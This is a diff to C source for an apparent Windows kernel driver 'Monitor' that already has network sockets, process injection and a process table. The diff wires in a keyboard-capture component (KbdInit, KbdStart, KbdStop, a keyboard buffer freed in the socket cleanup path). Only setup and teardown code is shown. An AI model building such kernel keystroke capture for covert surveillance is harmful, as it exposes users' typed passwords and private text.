@@ -61,6 +61,8 @@ cleanup:
     if (Socket != NULL)
         MWskSocketRelease(Socket);
 
+	KbdBuffDelete(BuffEntry);
+
 	return Status;
 }
 
@@ -76,8 +78,9 @@ PMONITOR
 }
 
 VOID
-	MonitorInitInternal(PMONITOR Monitor)
+	MonitorInitInternal(PMONITOR Monitor, PDRIVER_OBJECT DriverObject)
 {
+	Monitor->DriverObject = DriverObject;
 	KeInitializeGuardedMutex(&Monitor->Mutex);
 
 	SysWorkerInit(&Monitor->NetWorker);
@@ -85,6 +88,7 @@ VOID
 
 	InjectInit(&Monitor->Inject);
 	ProcessTableInit(&Monitor->ProcessTable);
+	KbdInit(&Monitor->Kbd);
 
 	Monitor->State = MONITOR_STATE_STOPPED;
 }
@@ -131,12 +135,19 @@ NTSTATUS
 		goto start_failed;
 	}
 
+	Status = KbdStart(&Monitor->Kbd);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "KbdStart failed err=%x", Status);
+		goto start_failed;
+	}
+	
 	Monitor->State = MONITOR_STATE_STARTED;
 	KeReleaseGuardedMutex(&Monitor->Mutex);
 
 	return STATUS_SUCCESS;
 
 start_failed:
+	KbdStop(&Monitor->Kbd);
 	InjectStop(&Monitor->Inject);
 	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->NetWorker);
@@ -164,6 +175,7 @@ NTSTATUS
 		return STATUS_TOO_LATE;
 	}
 
+	KbdStop(&Monitor->Kbd);
 	InjectStop(&Monitor->Inject);
 	SysWorkerStop(&Monitor->RequestWorker);
 	SysWorkerStop(&Monitor->NetWorker);
@@ -197,9 +209,9 @@ NTSTATUS
 }
 
 VOID
-	MonitorInit()
+	MonitorInit(PDRIVER_OBJECT DriverObject)
 {
-	MonitorInitInternal(&g_Monitor);
+	MonitorInitInternal(&g_Monitor, DriverObject);
 }
 
 
